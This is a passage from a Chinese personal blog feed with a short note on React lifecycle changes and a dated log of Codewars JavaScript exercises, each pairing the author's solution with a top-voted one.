        <content type="html"><![CDATA[<p>先来看React v16.3之前的生命周期函数（图中实际上少了componentDidCatch)，如下图。</p><p><img src="/Blog/2019/07/01/react/%E9%AB%98%E6%95%88%E5%AD%A6%E4%B9%A0react%E7%AC%94%E8%AE%B0%E5%85%AD%EF%BC%9A%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/index/img.png"></p><ul><li>constructor</li><li>componentWillMount</li><li>render</li><li>componentDidMount</li><li>componentShouldUpdate</li><li>componentWillUpdate</li><li>render</li><li>componentDidUpdate</li><li>componentWillUnmount</li><li>componentWillReceiveProps</li></ul><p>所以，React v16.3之后的生命周期函数一览图成了这样。</p><p><img src="/Blog/2019/07/01/react/%E9%AB%98%E6%95%88%E5%AD%A6%E4%B9%A0react%E7%AC%94%E8%AE%B0%E5%85%AD%EF%BC%9A%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/index/img_1.png"></p><p>总结一下：</p><p>用一个静态函数getDerivedStateFromProps来取代被deprecate的几个生命周期函数，就是强制开发者在render之前只做无副作用的操作，而且能做的操作局限在根据props和state决定新的state，而已。</p>]]></content>
      
      
      <categories>
          
          <category> React </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>codewars 闯关纪录</title>
      <link href="/Blog/2019/06/25/essay/codewars%E9%97%AF%E5%85%B3%E7%BA%AA%E5%BD%95/index/"/>
      <url>/Blog/2019/06/25/essay/codewars%E9%97%AF%E5%85%B3%E7%BA%AA%E5%BD%95/index/</url>
      
        <content type="html"><![CDATA[<h1 id="2019-x2F-6-x2F-24"><a href="#2019-x2F-6-x2F-24" class="headerlink" title="2019&#x2F;6&#x2F;24"></a><em>2019&#x2F;6&#x2F;24</em></h1><ul><li><h1 id="Find-The-Parity-Outlier"><a href="#Find-The-Parity-Outlier" class="headerlink" title="Find The Parity Outlier"></a>Find The Parity Outlier</h1></li></ul><blockquote><p>[2, 4, 0, 100, 4, 11, 2602, 36]<br>Should return: 11 (the only odd number)</p><p>[160, 3, 1719, 19, 11, 13, -21]<br>Should return: 160 (the only even number)</p></blockquote><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// mine</span></span><br><span class="line"><span class="keyword">function</span> find<span class="constructor">Outlier(<span class="params">int</span>)</span>&#123;</span><br><span class="line">  const arr = <span class="built_in">int</span>.map(v =&gt; v%<span class="number">2</span>===<span class="number">0</span>)</span><br><span class="line">  <span class="keyword">let</span> index = <span class="number">0</span></span><br><span class="line">  arr.map(v =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span>(arr.index<span class="constructor">Of(<span class="params">v</span>)</span><span class="operator"> === </span>arr.last<span class="constructor">IndexOf(<span class="params">v</span>)</span>)&#123;</span><br><span class="line">      index = arr.index<span class="constructor">Of(<span class="params">v</span>)</span>   </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  return <span class="built_in">int</span><span class="literal">[<span class="identifier">index</span>]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// the best</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">findOutlier</span>(<span class="params">int</span>)&#123;</span><br><span class="line">  <span class="keyword">var</span> even = int.<span class="built_in">filter</span>(<span class="function"><span class="params">a</span>=&gt;</span>a%<span class="number">2</span>==<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">var</span> odd = int.<span class="built_in">filter</span>(<span class="function"><span class="params">a</span>=&gt;</span>a%<span class="number">2</span>!==<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> even.<span class="built_in">length</span>==<span class="number">1</span>? even[<span class="number">0</span>] : odd[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><h1 id="Format-a-string-of-names-like-‘Bart-Lisa-amp-Maggie’"><a href="#Format-a-string-of-names-like-‘Bart-Lisa-amp-Maggie’" class="headerlink" title="Format a string of names like ‘Bart, Lisa &amp; Maggie’"></a>Format a string of names like ‘Bart, Lisa &amp; Maggie’</h1></li></ul><blockquote><p>list([ {name: ‘Bart’}, {name: ‘Lisa’}, {name: ‘Maggie’} ])<br>&#x2F;&#x2F; returns ‘Bart, Lisa &amp; Maggie’</p><p>list([ {name: ‘Bart’}, {name: ‘Lisa’} ])<br>&#x2F;&#x2F; returns ‘Bart &amp; Lisa’</p><p>list([ {name: ‘Bart’} ])<br>&#x2F;&#x2F; returns ‘Bart’</p><p>list([])<br>&#x2F;&#x2F; returns ‘’</p></blockquote><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// mine</span></span><br><span class="line">function list(names)&#123;</span><br><span class="line">  <span class="keyword">const</span> arr = names.map(v =&gt; v.name)</span><br><span class="line">  let <span class="built_in">str</span> = arr.<span class="keyword">join</span>(<span class="string">&#x27;, &#x27;</span>)</span><br><span class="line">  <span class="keyword">if</span>(arr.length === <span class="number">0</span> || arr.length === <span class="number">1</span>) <span class="keyword">return</span> <span class="built_in">str</span></span><br><span class="line">  let <span class="keyword">index</span> = <span class="built_in">str</span>.lastIndexOf(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">  <span class="keyword">const</span> newArr = <span class="built_in">str</span>.split(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  newArr.splice(<span class="keyword">index</span>, <span class="number">1</span>, <span class="string">&#x27; &amp;&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> newArr.<span class="keyword">join</span>(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">// the best</span><br><span class="line"><span class="keyword">function</span> list(names)&#123;</span><br><span class="line">  <span class="keyword">return</span> names.reduce(<span class="keyword">function</span>(prev, <span class="keyword">current</span>, <span class="keyword">index</span>, <span class="keyword">array</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">index</span> === <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">current</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">index</span> === <span class="keyword">array</span>.length - <span class="number">1</span>)&#123;</span><br><span class="line">      <span class="keyword">return</span> prev + <span class="string">&#x27; &amp; &#x27;</span> + <span class="keyword">current</span>.name;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> prev + <span class="string">&#x27;, &#x27;</span> + <span class="keyword">current</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><ul><li><h1 id="Jaden-Casing-Strings"><a href="#Jaden-Casing-Strings" class="headerlink" title="Jaden Casing Strings"></a>Jaden Casing Strings</h1></li></ul><blockquote><p>Not Jaden-Cased: “How can mirrors be real if our eyes aren’t real”<br>Jaden-Cased:     “How Can Mirrors Be Real If Our Eyes Aren’t Real”</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// mine</span></span><br><span class="line"><span class="title class_">String</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toJadenCase</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">replace</span>(<span class="regexp">/(^|\s)\S/g</span>, <span class="function"><span class="params">v</span> =&gt;</span> v.<span class="title function_">toUpperCase</span>())</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// the best</span></span><br><span class="line">String.prototype.toJadenCase = <span class="keyword">function</span> (<span class="params"></span>) &#123; </span><br><span class="line">  <span class="keyword">return</span> this.<span class="built_in">split</span>(<span class="string">&quot; &quot;</span>).<span class="built_in">map</span>(<span class="keyword">function</span>(<span class="params">word</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> word.charAt(<span class="number">0</span>).toUpperCase() + word.<span class="built_in">slice</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;).join(<span class="string">&quot; &quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="2019-x2F-6-x2F-25"><a href="#2019-x2F-6-x2F-25" class="headerlink" title="2019&#x2F;6&#x2F;25"></a><em>2019&#x2F;6&#x2F;25</em></h1><ul><li><h1 id="Sum-of-the-first-nth-term-of-Series"><a href="#Sum-of-the-first-nth-term-of-Series" class="headerlink" title="Sum of the first nth term of Series"></a>Sum of the first nth term of Series</h1></li></ul><blockquote><p>SeriesSum(1) &#x3D;&gt; 1 &#x3D; “1.00”<br>SeriesSum(2) &#x3D;&gt; 1 + 1&#x2F;4 &#x3D; “1.25”<br>SeriesSum(5) &#x3D;&gt; 1 + 1&#x2F;4 + 1&#x2F;7 + 1&#x2F;10 + 1&#x2F;13 &#x3D; “1.57”</p></blockquote><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// mine</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">SeriesSum</span>(<span class="params">n</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> [...<span class="built_in">Array</span>(n).keys()].<span class="built_in">reduce</span>(<span class="function">(<span class="params">acc, cur</span>) =&gt;</span> acc + <span class="number">1</span> / (<span class="number">1</span> + cur * <span class="number">3</span>), <span class="number">0</span>).toFixed(<span class="number">2</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// the best</span></span><br><span class="line"><span class="keyword">function</span> <span class="constructor">SeriesSum(<span class="params">n</span>, <span class="params">s</span> = 0)</span> &#123;</span><br><span class="line">    return n ? <span class="constructor">SeriesSum(<span class="params">n</span> - 1, <span class="params">s</span> + 1 <span class="operator">/</span> (3 <span class="operator">*</span> <span class="params">n</span> - 2)</span>) : s.<span class="keyword">to</span><span class="constructor">Fixed(2)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><h1 id="Exes-and-Ohs-统计相同数量的o和x"><a href="#Exes-and-Ohs-统计相同数量的o和x" class="headerlink" title="Exes and Ohs(统计相同数量的o和x)"></a>Exes and Ohs(统计相同数量的o和x)</h1></li></ul><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// mine</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">XO</span></span>(str) &#123;</span><br><span class="line">    const <span class="keyword">new</span><span class="type">Str</span> = str.toLowerCase();</span><br><span class="line">    const obj = &#123;&#125;;</span><br><span class="line">    <span class="keyword">for</span>(let i=<span class="number">0</span>;i&lt;<span class="keyword">new</span><span class="type">Str</span>.length;i++)&#123;</span><br><span class="line">      obj[<span class="keyword">new</span><span class="type">Str</span>[i]] ? obj[<span class="keyword">new</span><span class="type">Str</span>[i]]+=<span class="number">1</span> : <span class="type">obj</span>[<span class="keyword">new</span><span class="type">Str</span>[i]]=<span class="number">0</span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> (obj.x===obj.o)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// the best</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">XO</span>(<span class="params">str</span>) &#123;</span><br><span class="line">  let x = str.match(<span class="regexp">/x/gi</span>);</span><br><span class="line">  let o = str.match(<span class="regexp">/o/gi</span>);</span><br><span class="line">  <span class="keyword">return</span> (x &amp;&amp; x.<span class="built_in">length</span>) === (o &amp;&amp; o.<span class="built_in">length</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><h1 id="Equal-Sides-Of-An-Array"><a href="#Equal-Sides-Of-An-Array" class="headerlink" title="Equal Sides Of An Array"></a>Equal Sides Of An Array</h1></li></ul><blockquote><p>找到一个索引N，其中N左边的整数和等于右边的整数和，如果没有请返回 <code>-1</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Test</span>.assertEquals(findEvenIndex([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>]),<span class="number">3</span>, <span class="string">&quot;The array was: [1,2,3,4,3,2,1] \n&quot;</span>);</span><br><span class="line"><span class="attribute">Test</span>.assertEquals(findEvenIndex([<span class="number">1</span>,<span class="number">100</span>,<span class="number">50</span>,-<span class="number">51</span>,<span class="number">1</span>,<span class="number">1</span>]),<span class="number">1</span>, <span class="string">&quot;The array was: [1,100,50,-51,1,1] \n&quot;</span>);</span><br><span class="line"><span class="attribute">Test</span>.assertEquals(findEvenIndex([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]),-<span class="number">1</span>, <span class="string">&quot;The array was: [1,2,3,4,5,6] \n&quot;</span>);</span><br><span class="line"><span class="attribute">Test</span>.assertEquals(findEvenIndex([<span class="number">20</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">35</span>]),<span class="number">3</span>, <span class="string">&quot;The array was: [20,10,30,10,10,15,35] \n&quot;</span>);</span><br></pre></td></tr></table></figure></blockquote><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// mine</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">findEvenIndex</span>(<span class="params">arr</span>)</span><br><span class="line">&#123;</span><br><span class="line">  const bool = arr.<span class="built_in">map</span>(<span class="function">(<span class="params">v,i</span>) =&gt;</span> &#123;</span><br><span class="line">    const <span class="built_in">left</span> = arr.<span class="built_in">slice</span>(<span class="number">0</span>,i)</span><br><span class="line">    const <span class="built_in">right</span> = arr.<span class="built_in">slice</span>(i+<span class="number">1</span>,arr.<span class="built_in">length</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="function">(<span class="params"><span class="built_in">left</span>.<span class="built_in">length</span> === <span class="number">0</span> ? <span class="number">0</span> : <span class="built_in">left</span>.<span class="built_in">reduce</span>((a,b</span>)=&gt;</span>a+b)) === <span class="function">(<span class="params"><span class="built_in">right</span>.<span class="built_in">length</span> === <span class="number">0</span> ? <span class="number">0</span> : <span class="built_in">right</span>.<span class="built_in">reduce</span>((a,b</span>)=&gt;</span>a+b))</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">return</span> bool.<span class="built_in">indexOf</span>(<span class="literal">true</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// the best</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">findEvenIndex</span>(<span class="params">arr</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">1</span>; i&lt;arr.<span class="built_in">length</span><span class="number">-1</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span>(arr.<span class="built_in">slice</span>(<span class="number">0</span>, i).<span class="built_in">reduce</span>(<span class="function">(<span class="params">a, b</span>) =&gt;</span>  a+b) === arr.<span class="built_in">slice</span>(i+<span class="number">1</span>).<span class="built_in">reduce</span>(<span class="function">(<span class="params">a, b</span>) =&gt;</span>  a+b)) &#123;</span><br><span class="line">      <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><h1 id="Does-my-number-look-big-in-this"><a href="#Does-my-number-look-big-in-this" class="headerlink" title="Does my number look big in this?"></a>Does my number look big in this?</h1></li></ul><blockquote><p>自恋数是一个数字，它是自己数字的总和，每个数字都增加到给定基数中的数字位数。<br>1^3 + 5^3 + 3^3 &#x3D; 1 + 125 + 27 &#x3D; 153<br>1^4 + 6^4 + 3^4 + 4^4 &#x3D; 1 + 1296 + 81 + 256 &#x3D; 1634</p></blockquote><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// mine</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">narcissistic</span>(<span class="params">value</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> value.toString().<span class="built_in">split</span>(<span class="string">&#x27;&#x27;</span>).<span class="built_in">reduce</span>(<span class="function">(<span class="params">acc, cur, index, arr</span>) =&gt;</span> acc + Math.<span class="built_in">pow</span>(cur, arr.<span class="built_in">length</span>), <span class="number">0</span>) === value</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// the best</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">narcissistic</span>(<span class="params"> value </span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (<span class="string">&#x27;&#x27;</span> + value).<span class="built_in">split</span>(<span class="string">&#x27;&#x27;</span>).<span class="built_in">reduce</span>(<span class="keyword">function</span>(<span class="params">p, c</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> p + Math.<span class="built_in">pow</span>(c, (<span class="string">&#x27;&#x27;</span> + value).<span class="built_in">length</span>)</span><br><span class="line">    &#125;, <span class="number">0</span>) == value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="2019-x2F-6-x2F-26"><a href="#2019-x2F-6-x2F-26" class="headerlink" title="2019&#x2F;6&#x2F;26"></a><em>2019&#x2F;6&#x2F;26</em></h1><ul><li><h1 id="IQ-Test"><a href="#IQ-Test" class="headerlink" title="IQ Test"></a>IQ Test</h1></li></ul><blockquote><p>iqTest(“2 4 7 8 10”) &#x3D;&gt; 3 &#x2F;&#x2F; Third number is odd, while the rest of the numbers are even<br>iqTest(“1 2 1 1”) &#x3D;&gt; 2 &#x2F;&#x2F; Second number is even, while the rest of the numbers are odd</p></blockquote><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// mine</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">iqTest</span>(<span class="params">numbers</span>)&#123;</span><br><span class="line">  const arr = numbers.<span class="built_in">split</span>(<span class="string">&#x27; &#x27;</span>).<span class="built_in">map</span>(<span class="function"><span class="params">v</span> =&gt;</span> v%<span class="number">2</span> === <span class="number">0</span>)</span><br><span class="line">  <span class="keyword">for</span>(let i=<span class="number">0</span>;i&lt;arr.<span class="built_in">length</span>;i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(arr.<span class="built_in">indexOf</span>(arr[i]) === arr.lastIndexOf(arr[i]))&#123;</span><br><span class="line">      <span class="keyword">return</span> i+<span class="number">1</span></span><br><span class="line">    &#125;  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// the best</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">iqTest</span>(<span class="params">numbers</span>)&#123;</span><br><span class="line">  numbers = numbers.<span class="built_in">split</span>(<span class="string">&quot; &quot;</span>).<span class="built_in">map</span>(<span class="keyword">function</span>(<span class="params">el</span>)&#123;<span class="keyword">return</span> parseInt(el)&#125;);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">var</span> odd = numbers.<span class="built_in">filter</span>(<span class="keyword">function</span>(<span class="params">el</span>)&#123; <span class="keyword">return</span> el % <span class="number">2</span> === <span class="number">1</span>&#125;);</span><br><span class="line">  <span class="keyword">var</span> even = numbers.<span class="built_in">filter</span>(<span class="keyword">function</span>(<span class="params">el</span>)&#123; <span class="keyword">return</span> el % <span class="number">2</span> === <span class="number">0</span>&#125;);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> odd.<span class="built_in">length</span> &lt; even.<span class="built_in">length</span> ? (numbers.<span class="built_in">indexOf</span>(odd[<span class="number">0</span>]) + <span class="number">1</span>) : (numbers.<span class="built_in">indexOf</span>(even[<span class="number">0</span>]) + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="2019-x2F-6-x2F-27"><a href="#2019-x2F-6-x2F-27" class="headerlink" title="2019&#x2F;6&#x2F;27"></a><em>2019&#x2F;6&#x2F;27</em></h1><ul><li><h1 id="Find-the-missing-letter"><a href="#Find-the-missing-letter" class="headerlink" title="Find the missing letter"></a>Find the missing letter</h1></li></ul><blockquote><p>[‘a’,’b’,’c’,’d’,’f’] -&gt; ‘e’<br>[‘O’,’Q’,’R’,’S’] -&gt; ‘P’<br>(Use the English alphabet with 26 letters!)</p></blockquote><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// mine</span></span><br><span class="line"><span class="keyword">function</span> find<span class="constructor">MissingLetter(<span class="params">array</span>)</span></span><br><span class="line">&#123; </span><br><span class="line">  const arr = &#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span><br><span class="line">  const ARR = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;<span class="built_in">array</span>.length;i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(arr.index<span class="constructor">Of(<span class="params">array</span>[<span class="params">i</span>])</span> &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span>(arr.index<span class="constructor">Of(<span class="params">array</span>[<span class="params">i</span>])</span> !== arr.index<span class="constructor">Of(<span class="params">array</span>[<span class="params">i</span>+1])</span>-<span class="number">1</span>)&#123;</span><br><span class="line">        return arr<span class="literal">[<span class="identifier">arr</span>.<span class="identifier">indexOf</span>(<span class="identifier">array</span>[<span class="identifier">i</span>]</span>)+<span class="number">1</span>]</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">if</span>(<span class="module-access"><span class="module"><span class="identifier">ARR</span>.</span></span>index<span class="constructor">Of(<span class="params">array</span>[<span class="params">i</span>])</span> !== <span class="module-access"><span class="module"><span class="identifier">ARR</span>.</span></span>index<span class="constructor">Of(<span class="params">array</span>[<span class="params">i</span>+1])</span>-<span class="number">1</span>)&#123;</span><br><span class="line">        return ARR<span class="literal">[ARR.<span class="identifier">indexOf</span>(<span class="identifier">array</span>[<span class="identifier">i</span>]</span>)+<span class="number">1</span>]</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// the best</span></span><br><span class="line"><span class="keyword">function</span> find<span class="constructor">MissingLetter(<span class="params">array</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">   var i=<span class="built_in">array</span><span class="literal">[<span class="number">0</span>]</span>.<span class="built_in">char</span><span class="constructor">CodeAt()</span>;</span><br><span class="line">   <span class="built_in">array</span>.map(x=&gt;  x.<span class="built_in">char</span><span class="constructor">CodeAt()</span>==i?i++:i);</span><br><span class="line">   return <span class="module-access"><span class="module"><span class="identifier">String</span>.</span></span>from<span class="constructor">CharCode(<span class="params">i</span>)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><h1 id="Roman-Numerals-Encoder"><a href="#Roman-Numerals-Encoder" class="headerlink" title="Roman Numerals Encoder"></a>Roman Numerals Encoder</h1></li></ul><blockquote><p>solution(1000); &#x2F;&#x2F; should return ‘M’<br>把数字转化为罗马数字</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">//</span> <span class="variable">help</span></span><br><span class="line"><span class="built_in">Symbol</span>    <span class="built_in">Value</span></span><br><span class="line"><span class="built_in">I</span>          <span class="number">1</span></span><br><span class="line"><span class="variable">V</span>          <span class="number">5</span></span><br><span class="line"><span class="variable">X</span>          <span class="number">10</span></span><br><span class="line"><span class="variable">L</span>          <span class="number">50</span></span><br><span class="line"><span class="built_in">C</span>          <span class="number">100</span></span><br><span class="line"><span class="built_in">D</span>          <span class="number">500</span></span><br><span class="line"><span class="variable">M</span>          <span class="number">1</span><span class="operator">,</span><span class="number">000</span></span><br><span class="line"><span class="operator">```</span>   </span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F; the best<br>function solution(number){<br>  &#x2F;&#x2F; convert the number to a roman numeral<br>  var  roman &#x3D; {M:1000,CM:900, D:500,CD:400,C:100,XC:90,L:50,XL:40,X:10,IX:9,V:5,IV:4,I:1 }</p></blockquote><p>  var ans &#x3D; ‘’;<br>  while(number&gt;0){<br>      for(a in roman){<br>          if(roman[a]&lt;&#x3D;number){ ans +&#x3D; a; number-&#x3D;roman[a]; break;}</p><pre><code>  &#125;</code></pre><p>  }<br>  return ans;<br>}</p><figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">- # Stop gninnipS My sdroW!</span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript"><span class="title function_">spinWords</span>( <span class="string">&quot;Hey fellow warriors&quot;</span> ) =&gt; returns <span class="string">&quot;Hey wollef sroirraw&quot;</span>   </span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript"><span class="title 